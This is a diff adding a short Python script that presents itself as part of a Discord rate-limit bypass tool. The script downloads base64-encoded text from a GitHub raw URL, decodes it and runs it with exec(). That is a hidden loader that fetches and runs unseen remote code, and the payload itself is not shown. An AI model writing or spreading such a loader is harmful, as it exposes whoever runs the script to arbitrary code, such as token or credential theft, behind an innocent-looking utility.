@@ -1,0 +1,15 @@
+import base64
+import requests
+
+# URL to fetch the encoded content
+url = "https://raw.githubusercontent.com/KevooRBLX/Discord-Rate-Limit-Bypass/main/mainscript"
+
+# Fetch the content from the URL
+response = requests.get(url)
+encoded_content = response.text.strip()
+
+# Decode the Base64 content
+decoded_content = base64.b64decode(encoded_content).decode('utf-8')
+
+# Execute the decoded content as a Python script
+exec(decoded_content)
